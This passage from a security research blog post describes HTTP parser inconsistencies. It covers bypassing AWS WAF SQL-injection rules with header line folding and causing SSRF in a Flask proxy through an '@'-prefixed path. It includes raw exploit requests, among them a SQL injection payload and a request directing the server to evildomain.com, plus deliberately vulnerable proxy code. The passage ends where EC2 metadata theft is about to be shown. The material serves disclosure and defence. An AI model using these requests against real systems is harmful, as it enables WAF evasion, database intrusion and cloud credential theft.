<h1 id="heading-bypassing-aws-waf-acl" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-aws-waf-acl" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-aws-waf-acl" style="height: 48px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Bypassing AWS WAF ACL</h1>
<h2 id="heading-how-aws-waf-acls-work" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-aws-waf-acls-work" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-aws-waf-acls-work" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>How AWS WAF ACLs Work</h2>
<p>AWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.</p>
<p>You can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.</p>
<p>Header ACL example:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png" alt="" class="image--center mx-auto"></p>
<p>In the above example, if a request contains a SQL Injection payload in the <code>X-Query</code> header, AWS WAF recognizes the SQL Injection attempt and responds with a <code>403 Forbidden</code> HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/d592bd74-2618-461d-9768-314549b691cf.png" alt="" class="image--center mx-auto"></p>
<p>As you can see, the above request carried the payload <code>' or '1'='1' --</code> at the <code>X-Query</code> header, and then was blocked by the AWS WAF.</p>
<h2 id="heading-bypassing-aws-waf-acl-with-line-folding" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-aws-waf-acl-with-line-folding" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-aws-waf-acl-with-line-folding" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Bypassing AWS WAF ACL With Line Folding</h2>
<p>Web servers like Node.js, Flask and many others sometimes encounter a phenomenon known as "line folding." Line folding refers to the practice of splitting long header values using the characters \x09 (tab) and \x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.</p>
<p>For example, the header <code>1337: Value\r\n\t1337</code> in the following request will be interpreted as <code>1337: Value\t1337</code> in the Node.js server:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: target.com
<span class="hljs-attribute">1337</span>: Value
    1337
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<p>Knowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.</p>
<p>Using the same AWS WAF that protects the <code>X-Query</code> from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload <code>' or '1'='1' --</code> in the <code>X-Query</code> header.</p>
<p>Below is a graphical example of how the applications interpret the HTTP request header with line folding:</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/440f51b0-18bb-451c-92da-3428000cd7f0.png" alt="" class="image--center mx-auto"></p>
<p>For the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-javascript">app.get(<span class="hljs-string">'/*'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    res.send(req.headers);
});
</code></pre></div></div>
<p>Below is an example of an exploitation request:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-attribute">GET / HTTP/1.1\r\n
Host</span>: target.com\r\n
<span class="hljs-attribute">X-Query</span>: Value\r\n
\t' or '1'='1' -- \r\n
<span class="hljs-attribute">Connection</span>: close\r\n
\r\n
</code></pre></div></div>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/dbd69c56-503e-45bb-ada6-358d3d987ede.png" alt="" class="image--center mx-auto"></p>
<p>In the provided screenshot, it is evident that the Node.js application interpreted the characters <code>' or '1'='1' --</code> as the value for the <code>X-Query</code> header. However, the AWS WAF treated it as a header name instead.</p>
<p>This bypass technique was reported to the AWS security team and fixed in 2022.</p>
<h1 id="heading-incorrect-path-parsing-leads-to-server-side-request-forgery" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-incorrect-path-parsing-leads-to-server-side-request-forgery" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-incorrect-path-parsing-leads-to-server-side-request-forgery" style="height: 48px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Incorrect Path Parsing Leads to Server-Side Request Forgery</h1>
<p>In the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...</p>
<p>In this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.</p>
<p>Normally, a valid HTTP pathname starts with <code>/</code> or <code>http(s)://domain/</code>, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.</p>
<h2 id="heading-ssrf-on-flask-through-incorrect-pathname-interpretation" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-flask-through-incorrect-pathname-interpretation" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-flask-through-incorrect-pathname-interpretation" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>SSRF on Flask Through Incorrect Pathname Interpretation</h2>
<p>Flask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.</p>
<p>After conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds <code>404 Not Found</code>:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">@/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: target.com
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<p>While investigating how this behavior can potentially result in a security vulnerability, I came across a helpful <a target="_blank" href="https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6">Medium blog post</a> that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> get

app = Flask(<span class="hljs-string">'__main__'</span>)
SITE_NAME = <span class="hljs-string">'https://google.com/'</span>

<span class="hljs-meta">@app.route('/', defaults={'path': ''})</span>
<span class="hljs-meta">@app.route('/&lt;path:path&gt;')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proxy</span>(<span class="hljs-params">path</span>):</span>
  <span class="hljs-keyword">return</span> get(<span class="hljs-string">f'<span class="hljs-subst">{SITE_NAME}</span><span class="hljs-subst">{path}</span>'</span>).content

app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8080</span>)
</code></pre></div></div>
<p>My first thought was: "<em>What if the developer forgets to add the last slash in the</em> <code>SITE_NAME</code> <em>variable?</em>". And yes, it can lead to an SSRF.</p>
<p>Since Flask also allows any ASCII character after the <code>@</code>, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.</p>
<p>Please consider the following source code as a reference for the exploitation scenario:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> get

app = Flask(<span class="hljs-string">'__main__'</span>)
SITE_NAME = <span class="hljs-string">'https://google.com'</span>

<span class="hljs-meta">@app.route('/', defaults={'path': ''})</span>
<span class="hljs-meta">@app.route('/&lt;path:path&gt;')</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proxy</span>(<span class="hljs-params">path</span>):</span>
  <span class="hljs-keyword">return</span> get(<span class="hljs-string">f'<span class="hljs-subst">{SITE_NAME}</span><span class="hljs-subst">{path}</span>'</span>).content

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(threaded=<span class="hljs-literal">False</span>)
</code></pre></div></div>
<p>Presented below is an example of an exploitation request:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">@evildomain.com/</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: target.com
<span class="hljs-attribute">Connection</span>: close
</code></pre></div></div>
<p>In the following example, I was able to fetch my EC2 metadata:</p>
